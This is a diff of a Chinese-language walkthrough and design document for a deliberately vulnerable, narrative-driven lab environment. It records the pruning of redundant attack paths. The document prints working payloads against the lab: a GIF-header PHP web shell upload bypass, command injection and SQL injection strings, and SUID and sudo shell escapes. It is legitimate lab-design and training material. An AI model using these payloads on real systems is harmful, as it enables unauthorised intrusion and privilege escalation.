@@ -42,12 +42,13 @@
 
 ## 1. 設計原則回顧（為什麼會長這樣）
 
-1. **漏洞機制原封不動沿用 VulnCastle**（command injection / XSS / upload / LFI / IDOR / SSRF / SQLi / SUID / sudo 誤設 / writable cron / Samba guest / Redis 無認證 / 憑證重用），只換敘事外皮。理由見 `BLACK_ARCHIVE_Modification_Plan.md` §19、`legacy-mechanics.md`。
+1. **漏洞機制原封不動沿用 VulnCastle**，只換敘事外皮（原始清單見 `legacy-mechanics.md`，那是凍結記錄，不隨後續修剪更新）。理由見 `BLACK_ARCHIVE_Modification_Plan.md` §19。**這份清單本身在第十三輪後已經不等於目前的實際漏洞集合**——見原則 7。
 2. **沒有 CTF 解謎感**：沒有 Base64/ROT/steganography/密碼謎語，所有「解謎」都是資安 enumeration 或劇情層面的交叉比對。
 3. **資安 ≠ 唯一難度來源**：這一輪修正後，加入了三個純粹靠推理才能解開的節點（見第 3.3、4.4、5.4 節），不是打完漏洞就結束。
 4. **不要 brute force 當主要 progression**：每一組要用到的密碼都有合法（非暴力破解）的發現管道，見附錄 B。
 5. **Flag 不是 `FLAG{}`**：每個原本的 flag 節點都換成一份真的文件（memo / DB 列 / SMB 檔案 / admin panel 紀錄）。
 6. **這不是一個「為了被駭而存在」的環境，是一個真環境，玩家只是恰好在調查它**：這一輪特別加強了訊噪比——搜尋索引從 3 筆加到 7 筆（另外 4 筆是普通對照組）、`/notes/` 從 3 個檔案加到 6 個、webmail 從 3 封信加到 11 封、`service_accounts` 加了 2 筆死線索、SMB 三個分享都各加了 1 份純填充文件。這些新增內容**全部跟劇情/漏洞無關**，目的是讓玩家自己分辨「這個值得看」跟「這只是辦公室的日常雜物」，而不是每個列出來的東西都注定是線索。下面每一節看到「純填充」「死線索」字樣的地方，都是刻意加入的噪音，不是漏改的殘留內容。
+7. **一條攻擊鏈，不要多餘的漏洞**（第十三輪起）：每個 host 只保留一條通到下一關的必經路徑；「多選一」的立足點/提權分支、跟主線拿到同一份東西的第二條路、以及打穿也不會給你任何額外資訊的漏洞（純示範用的 SSRF/command injection/path traversal、無認證但完全沒東西可拿的 Redis），一律砍掉，不當「反正留著也沒差」的裝飾。判斷標準：**兩個漏洞如果拿到一樣的東西，只留一個；一個漏洞如果拿完之後沒有任何新資訊、也不是往下一關的必經路，直接砍**。FRONTIER、RELAY 現在都沒有本機 root 提權——兩台的 root 本來就解鎖不了任何東西，留著只是「反正可以打」的兔子洞。細節見 `../Answer/evidence-map.md` 第十三輪。
 
 ---
 
@@ -81,23 +82,16 @@ curl "http://TARGET:8080/?page=search&q=Farrow"
 
 `$DEPENDENT_INDEX` 這個搜尋後端其實有 **7 筆**公開可查的紀錄，不只 LONGSHORE 給的這 3 筆：另外 4 筆（Priya Anand / Marcus Webb / Dana Song / Theo Alvarez）是刻意放進去的對照組——都是普通、平凡的案件，狀態各自是 Active / Active / Active / Closed-relocated，沒有任何異常欄位。玩家如果好奇多搜尋幾個名字，看到的應該是「大部分紀錄都很正常」，這樣 3 筆有問題的紀錄才顯得異常，而不是讓玩家覺得「這整個系統都是為了劇情設計的」。relay 的 MariaDB 裡還有 2 筆（Nadia Oyelaran / Kenji Park）**只存在 DB 裡，這個公開搜尋介面查不到**，屬於 Act II 才會看到的背景資料，見 3.3 節。
 
-`?q=` 本身有 **reflected XSS**（`Results for: <query>` 沒做 escaping），可用來練習/示範，但不是主線必經之路。
+`?q=` 原本有 reflected XSS，`?page=ping` 原本有 command injection，`?page=notes&file=` 原本有 path traversal——這三個都跟 upload 一樣能拿到 www-data，屬於「多選一但拿到同一個東西」，第十三輪已經全部修掉，只留 upload 這一條唯一的立足點（理由見原則 7）。`ping` 頁面本身還在（`escapeshellarg()` + hostname 格式驗證，正常能 ping），`notes` 也還在（`basename()` 擋掉 `../` traversal），只是不再是漏洞。
 
-### 2.3 三選一拿初始立足點（www-data）— 三條路現在有不同 tradeoff
+### 2.3 拿初始立足點（www-data）
 
-- **Command Injection（容易找到，利用較麻煩）**：`?page=ping`。todo.txt 提到的「上次事故後修過」只堵了 `;`（`str_replace(';', '', $host)`），換行符、backtick、`$()` 都沒擋：
-  ```bash
-  curl -X POST "http://TARGET:8080/?page=ping" --data $'host=127.0.0.1\nid'
-  # 或
-  curl -X POST "http://TARGET:8080/?page=ping" --data 'host=$(id)'
-  ```
-- **Unrestricted Upload（較難 enumerate，exploit 乾淨）**：`?page=upload` 現在會用 `getimagesize()` 擋掉非圖片檔（todo.txt 標成 SEC-1188 已修），但沒有 extension allowlist、沒有 rename，`.php` 副檔名照樣被 php-fpm 執行。`getimagesize()` 只檢查檔頭結構，不驗證檔案其餘內容 —— 在合法 GIF 檔頭（`GIF89a` + 最小 logical screen descriptor）後面直接接 PHP payload 即可過檢查，且必須手動拼 multipart body（Burp Repeater 或 curl `--data-binary`），不能只是在檔案選擇對話框挑一個 `.php`：
-  ```bash
-  printf 'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00<?php system($_GET["c"]); ?>' > shell.php
-  curl -F "file=@shell.php;type=image/gif" "http://TARGET:8080/?page=upload"
-  curl "http://TARGET:8080/uploads/shell.php?c=id"
-  ```
-- **LFI / Path Traversal（只有 information disclosure，需要 chain 才能拿 shell）**：`?page=notes&file=../../../../etc/passwd` 可讀任意檔案，但拿不到 shell，只能讀檔。
+**Unrestricted Upload**：`?page=upload` 用 `getimagesize()` 擋掉非圖片檔（todo.txt 標成 SEC-1188 已修），但沒有 extension allowlist、沒有 rename，`.php` 副檔名照樣被 php-fpm 執行。`getimagesize()` 只檢查檔頭結構，不驗證檔案其餘內容 —— 在合法 GIF 檔頭（`GIF89a` + 最小 logical screen descriptor）後面直接接 PHP payload 即可過檢查，且必須手動拼 multipart body（Burp Repeater 或 curl `--data-binary`），不能只是在檔案選擇對話框挑一個 `.php`：
+```bash
+printf 'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00<?php system($_GET["c"]); ?>' > shell.php
+curl -F "file=@shell.php;type=image/gif" "http://TARGET:8080/?page=upload"
+curl "http://TARGET:8080/uploads/shell.php?c=id"
+```
 
 ### 2.4 Support Tickets — 建立懷疑 + 找到合法密碼來源
 ```bash
@@ -165,14 +159,11 @@ curl http://127.0.0.1:3000/                       # 列出全部 endpoint（在 
 curl http://127.0.0.1:3000/api/cases               # 列出全部案件（IDOR：無授權檢查）
 curl http://127.0.0.1:3000/api/cases/1              # Eli Okafor — 帶 transfer_ref: SPINDLE-7-0119
 curl http://127.0.0.1:3000/api/cases/5              # 不是案件，是系統帳號：ledger-cairn-sync
-curl http://127.0.0.1:3000/api/health                # 洩漏 cairn.internal:445 / :6379
+curl http://127.0.0.1:3000/api/health                # 洩漏 cairn.internal:445
 ```
 關鍵發現：`/api/cases/1~3` 都是「已結案死亡」卻帶有一個不該存在的 `transfer_ref`（`SPINDLE-7-01xx`）。`/api/cases/4`（Priya Anand）沒有 `transfer_ref` —— 這是刻意放的對照組，讓玩家自己比較出「不是每筆資料都異常」。
 
-其他洞（示範/次要，非主線必經）：
-- `/api/fetch?url=` — SSRF，可用來探測 internal 網段服務。
-- `POST /api/diagnostics` `{"target":"a; id"}` — command injection。
-- `/api/files?name=../../../../etc/passwd` — path traversal。
+（第十三輪移除：原本這個 API 還有 `/api/fetch?url=` SSRF、`/api/diagnostics` command injection、`/api/files?name=` path traversal 三個「示範用」的洞——SSRF/path traversal 拿到的東西跟 `/api/health` 已經給的資訊重複，command injection 在修掉 supervisord 的 root 執行問題之前，甚至是一條從 frontier 就能直接打、完全不用先拿 relay shell 的意外 root 捷徑。三個都跟主線沒有關係，也不會給任何獨有資訊，已經整段刪除，不再是這台的攻擊面。）
 
 ### 3.3 MariaDB — 真正的憑證與稽核矛盾來源
 ```bash
@@ -188,13 +179,12 @@ SELECT * FROM service_accounts;
 | service_name | username | password | host |
 |---|---|---|---|
 | CAIRN Fileshare | sysadmin | admin123 | cairn.internal |
-| CAIRN Cache | (無) | (無) | cairn.internal:6379 |
 | Gateway Maintenance SSH | backup | backup | relay.internal |
 | Floor Print Server | printsvc | printsvc | printsvc.internal:9100（死線索，host 不回應） |
 | Conference Room Booking | booking-svc | B00king2019 | roombook.internal:80（死線索，兩年前系統換掉了，只是沒人下架這筆） |
 | Vending Machine Telemetry | vendtel | vendtel | vendtel.internal:8081（死線索，回報庫存用，跟劇情完全無關） |
 
-`service_accounts` 現在共 **6 筆**，其中後兩筆是純填充的死線索——真實環境裡這種「早就沒用但沒人清理的舊帳號」很常見，故意留著讓玩家自己判斷哪些值得追。CAIRN Fileshare 這筆再次驗證「同一組密碼到處重複用」（Samba 跟 SSH/webmail 共用）。**這張表不再直接給出 CAIRN Records Terminal 的帳密**——那組憑證要靠下一步的環境探索才找得到，不是單純 `SELECT *` 就拿到下一關全部鑰匙。
+`service_accounts` 現在共 **5 筆**，其中後三筆是純填充的死線索——真實環境裡這種「早就沒用但沒人清理的舊帳號」很常見，故意留著讓玩家自己判斷哪些值得追。CAIRN Fileshare 這筆再次驗證「同一組密碼到處重複用」（Samba 跟 SSH/webmail 共用）。**這張表不再直接給出 CAIRN Records Terminal 的帳密**——那組憑證要靠下一步的環境探索才找得到，不是單純 `SELECT *` 就拿到下一關全部鑰匙。（第十三輪移除了原本的「CAIRN Cache」一筆：那是 archive 上一個無認證的 Redis，除了「存在、沒東西可拿」之外沒有任何獨有資訊，整個 Redis 服務已經從 archive 拿掉。）
 
 ```sql
 SELECT * FROM dependent_case_index;   -- 背景資料，共 10 筆：Act I 公開搜尋能查到的 7 筆全部都在這裡，
@@ -225,12 +215,7 @@ sync_pass = Records!Access99
 ### Act II 結論
 玩家現在知道：這些孩子在系統裡被當成某種「candidate」處理、有個叫 CAIRN 的更高機密系統、ONI Section III 跟 Cmdr. Petrov 的名字第一次出現、官方紀錄跟你自己查到的東西對不上。**還不知道** SPARTAN-II 這個名稱、flash-clone 機制、Halsey 的角色。
 
-### 3.5（附）RELAY 本機提權（非主線必經，但完整記錄）
-```bash
-find / -perm -4000 -type f 2>/dev/null   # 列出 SUID 檔案，會看到 /usr/local/bin/spindle-legacy-diag
-/usr/local/bin/spindle-legacy-diag -c 'import os; os.setuid(0); os.system("/bin/bash")'
-```
-`spindle-legacy-diag` 這個名字本身不會暴露它其實是什麼——它就是 `/usr/bin/python3` 的一份複製檔，只是被改了名字、加了 SUID bit。名字刻意取得像一個真的內部工具（SPINDLE 那個年代留下來的診斷腳本，原始的 wrapper script 早就不在了，只剩被 SUID 過的直譯器本體），不會讓玩家單看檔名就知道答案，要真的執行它才會發現這其實是一個完整的 Python REPL。（`sudo -l` 上的 `NOPASSWD: /usr/bin/socat` 已移除——socat 留著是給玩家自己拿來做 pivoting/tunneling 用，不再是免密碼 root 捷徑。這台的本機提權現在只剩這一條，仍然是刻意保留的簡單 optional 分支，非主線必經。）
+RELAY 沒有本機 root 提權（第十三輪移除了原本的 SUID `spindle-legacy-diag`）：root 在這台解鎖不了任何東西（`/etc/ledger/sync.conf` 本身就是 644，`sysadmin` 就讀得到），留著只是一個打完也什麼都不會多知道的兔子洞。`socat` 還在，但只是給玩家自己拿來 pivoting/tunneling 用的工具，不是提權捷徑（原本掛在 `sudo -l` 上的 `NOPASSWD: /usr/bin/socat` 也已經在更早一輪移除）。
 
 ---
 
@@ -302,21 +287,14 @@ proxychains4 smbclient //cairn.internal/backups -U sysadmin%admin123 -m NT1 \
 - `n.okafor_badge_photo.jpg` — 一張員工識別證照片，跟 relay `system_migration_log` 裡「Processed by: N. Okafor, Colonial Records Clerk」那筆紀錄對得上，也剛好跟同一個分享夾裡 `dependent_notification_fragment.txt` 提到的監護人同名同姓。純粹是「這張照片剛好也在這個備份資料夾裡」的巧合擺放，沒有任何文字說明特別指出兩者是同一人——玩家自己要注意到名字重複。這是刻意加強 Naomi Okafor 身份線索真實感的素材，不是必經節點。
 - `old_budget_q3_2546.txt` — 純填充，一份過季的預算摘要，跟劇情完全無關，放著只是因為「備份資料夾裡通常什麼都有」。
 
-### 4.3 SQLi 進 CAIRN Records Terminal（8080）— 要抓包才會發現該換欄位
+### 4.3 登入 CAIRN Records Terminal（8080）
 
-直接把經典 payload 貼在 `username` 欄位已經不再有效：
+用 3.3b 節從 `sync.conf` 找到的 `administrator / Records!Access99` 登入：
 ```bash
-proxychains4 curl -i -X POST http://cairn.internal:8080/login --data "username=administrator' -- &password=x"
-# 這次不會 302 -> /dashboard 了
-```
-原因：這台之前收過一份 pentest finding（SEC-2211），修法是把 `username` 欄位的單引號跟 `--` 直接 strip 掉——`admin_panel.py` 裡 `username = username.replace("'", "").replace("--", "")`。這個修法只針對 finding 報告裡點名的欄位，同一條 f-string 組出來的查詢在 `password` 欄位完全沒有動過。玩家需要實際用 Burp Repeater（或手動改 curl）測試把 injection 換到 `password` 欄位，才會發現同一個弱點還在：
-```bash
-proxychains4 curl -i -c cairn_cookies.txt -X POST http://cairn.internal:8080/login --data "username=administrator&password=x' OR '1'='1"
+proxychains4 curl -i -c cairn_cookies.txt -X POST http://cairn.internal:8080/login --data "username=administrator&password=Records!Access99"
 # 302 -> /dashboard，回應帶 Set-Cookie: cairn_session=<token>
 ```
-（原理：`SELECT * FROM admins WHERE username='administrator' AND password='x' OR '1'='1'`，`AND` 比 `OR` 先算，右邊的 `'1'='1'` 恆真，整個 WHERE 恆真，回傳第一筆。）
-
-也可以不用 SQLi，直接用 3.3 節洩漏的 `administrator / Records!Access99` 正常登入——**兩條路都通**，SQLi 不是唯一解，兩者互不影響。
+（第十三輪移除：這個登入原本還有一條 SQL injection 的替代路徑——`username` 欄位在一次 pentest finding 後被 strip 掉單引號/`--`，但同一條 f-string 組出來的查詢在 `password` 欄位完全沒有動過，換欄位就能繞過去。跟合法帳密拿到的是完全一樣的 session/dashboard，兩條路是純粹的「拿到同一個東西」，已經改成參數化查詢把 SQLi 徹底修掉，只留合法帳密這一條——這條本身就是主線必經，跟 3.3b 節的 credential discovery 直接掛鉤，不是捷徑。）
 
 **`/dashboard`、`/records/*` 現在有真的 session 檢查**（`admin_panel.py` 的 `VALID_SESSIONS`/`has_valid_session`），沒帶登入時拿到的 `cairn_session` cookie 一律 302 回首頁——**一定要用 `-b` 帶上面 `-c` 存下來的 cookie**，不能像沒有這個檢查時那樣直接裸 curl：
 ```bash
@@ -410,9 +388,9 @@ cat /root/cairn_disposition_review.txt
 
 | Host | 立足點 | 提權 |
 |---|---|---|
-| frontier | command injection（過濾 `;` 但漏其他分隔符）/ upload（getimagesize magic-byte bypass）/ LFI（www-data） | `sudo -l` → `(ALL) NOPASSWD: /usr/bin/find` → `sudo find . -exec /bin/sh \;`；或 `id` 發現 `www-data` 是 `ops` 群組成員 → `/opt/backup.sh`（root:ops，770，group-writable，root cron `*/5` 執行）改內容等它被執行 —— 這兩條是刻意保留的簡單 optional 分支，非主線必經（`/opt/backup.sh` 不是單純 `chmod 777`，要先注意到自己在 `ops` 群組裡才會想到去查這個檔案，不是 `find / -perm -002` 一行指令就直接列出來） |
-| relay | SSH 密碼重用（sysadmin） | `find / -perm -4000` 列出 SUID 檔案 → `/usr/local/bin/spindle-legacy-diag`（唯一分支，`sudo socat` NOPASSWD 已移除） —— 名字刻意取得像一個真的 SPINDLE 遺留診斷工具，不會讓玩家單看檔名猜到答案，同樣是 optional 分支，非主線必經 |
-| archive | 讀文件不需要 shell：SQLi（要換到 password 欄位才有效）/ 合法帳密 / SMB 都能直接拿到大部分內容。**但要 shell（提權必要）就只有一條路**：SMB confidential share 裡的 `cairn_backup_key`，SSH 密碼認證在這台被關掉了（`sysadmin/admin123` 對 SSH 完全無效，只有 Samba 還吃這組密碼）——這是刻意設計，避免密碼重用直接跳過整個 Act III 拿 shell | PATH hijack：cron 用 root 執行 `/opt/healthcheck.sh`（讀得到寫不到），腳本呼叫未寫絕對路徑的 `logtool`，root crontab 的 `PATH=` 把 `/opt/staging` 排在前面且對 `release` 群組（`sysadmin` 是成員）可寫 —— **這是主線最終提權，需要多步 enumeration，不是單一 GTFOBins/world-writable 捷徑**（群組刻意不叫 `deploy`，避免跟 base image 既有的 `deploy` 帳號的 primary group 撞名） |
+| frontier | upload（getimagesize magic-byte bypass，www-data） | 無。root 在這台解鎖不了任何東西，第十三輪把 `sudo -l` NOPASSWD find 跟 `/opt/backup.sh` 群組寫入兩條「打得到但沒有回報」的路都移除了，不留兔子洞 |
+| relay | SSH 密碼重用（sysadmin） | 無。理由同上，第十三輪移除了 SUID `spindle-legacy-diag` |
+| archive | 合法帳密（`administrator/Records!Access99`）/ SMB 都能直接拿到大部分內容。**但要 shell（提權必要）就只有一條路**：SMB confidential share 裡的 `cairn_backup_key`，SSH 密碼認證在這台被關掉了（`sysadmin/admin123` 對 SSH 完全無效，只有 Samba 還吃這組密碼）——這是刻意設計，避免密碼重用直接跳過整個 Act III 拿 shell | PATH hijack：cron 用 root 執行 `/opt/healthcheck.sh`（讀得到寫不到），腳本呼叫未寫絕對路徑的 `logtool`，root crontab 的 `PATH=` 把 `/opt/staging` 排在前面且對 `release` 群組（`sysadmin` 是成員）可寫 —— **這是主線最終提權，需要多步 enumeration，不是單一 GTFOBins/world-writable 捷徑**（群組刻意不叫 `deploy`，避免跟 base image 既有的 `deploy` 帳號的 primary group 撞名） |
 
 ## 附錄 B：每一組密碼的「合法發現管道」（不需要 brute force）
 
